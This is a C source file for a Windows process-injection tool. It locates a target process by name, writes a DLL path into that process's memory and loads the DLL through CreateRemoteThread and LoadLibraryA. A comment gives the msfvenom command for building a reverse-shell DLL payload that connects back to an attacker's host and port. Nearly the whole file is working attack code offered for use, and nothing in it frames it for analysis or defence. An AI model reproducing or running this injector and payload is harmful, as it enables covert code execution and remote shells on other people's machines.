# include <stdio.h>
# include <windows.h>
# include <string.h>
# include <Tlhelp32.h>
void ErrorMessagess(DWORD status){
    char buffer[256];
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,NULL,status,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),buffer,sizeof(buffer)/sizeof(char),NULL);
    printf("[+] Error is %s \n", buffer);
}
// command used :msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.0.0 LPORT=1234 EXITFUNC=thread -f dll


DWORD FindTargetProc( const char *targetprocess){
    HANDLE prcs;
    int flag;
    PROCESSENTRY32 pe32;
    DWORD pid=0;
    prcs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(prcs==INVALID_HANDLE_VALUE){
        printf("[+] Error Occured while Taking Snapshot of the process");
        DWORD dwStatusError=GetLastError();
        ErrorMessagess(dwStatusError);
        exit(0);
    }
    else{
          pe32.dwSize=sizeof(PROCESSENTRY32);
          //retrieving info about the first process
          BOOL values=Process32First(prcs,(LPPROCESSENTRY32)&pe32);
          if(values==FALSE){
             printf("Error Occured while Copying the First Process to buffer");
            DWORD dwStatusError=GetLastError();
            ErrorMessagess(dwStatusError);
            exit(0);
          }
          
          else{
             while(Process32Next(prcs,(LPPROCESSENTRY32)&pe32)){
                int cmp=strcasecmp(targetprocess,pe32.szExeFile);
                if(cmp==0){
                    printf("\n[+] Process found\n");
                    pid=pe32.th32ProcessID;
                    flag=1;
                    break;
                }
                
             }
             if(flag !=1){
                printf("[+] Could not find the process\n");
                exit(0);
             }
          }

    }
    return pid;
}



int main(int argc, char* argv[]){
    unsigned char *dllPath=argv[1];
    unsigned char *ProcessName=argv[2];
    
    DWORD ProcessId=FindTargetProc(ProcessName);
    printf("[+] Process ID is %d\n",ProcessId);

    HANDLE prcsID;
    prcsID=OpenProcess(PROCESS_ALL_ACCESS,FALSE,ProcessId);
    if(prcsID==NULL){
        printf("[+] Error: Can not create handle to process");
        DWORD dwStatusError=GetLastError();
        ErrorMessagess(dwStatusError);
        exit(0);
    }
    //injecing DLL into the process
    
    LPVOID addr=NULL;
    LPVOID Loadlibaddr=NULL;
    DWORD threadid;
    DWORD lpNumberOfBytesWritten;
    HANDLE th;
    addr=VirtualAllocEx(prcsID,NULL,strlen(dllPath)+1,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    HANDLE mod=GetModuleHandle("kernel32");

    Loadlibaddr=GetProcAddress(mod,"LoadLibraryA");
    if(Loadlibaddr==NULL || addr==NULL){
        printf("null");
    }
    
    if((WriteProcessMemory(prcsID,addr,dllPath,strlen(dllPath)+1,(SIZE_T *)&lpNumberOfBytesWritten)) != 0){
        printf("[+] Data Injected Successfully\n");
        th=CreateRemoteThread(prcsID,NULL,0,(LPTHREAD_START_ROUTINE)Loadlibaddr,addr,0,NULL);
        if(th==NULL){
            printf("[+] Error :Cannot Create Thread\n");
            DWORD dwStatusError=GetLastError();
            ErrorMessagess(dwStatusError);
            exit(0);
            }
        else {
            printf("[+] Executing Command\n");
            WaitForSingleObject(th,-1);
            CloseHandle(prcsID);
        }
    }
    
    return 1;
    }
    
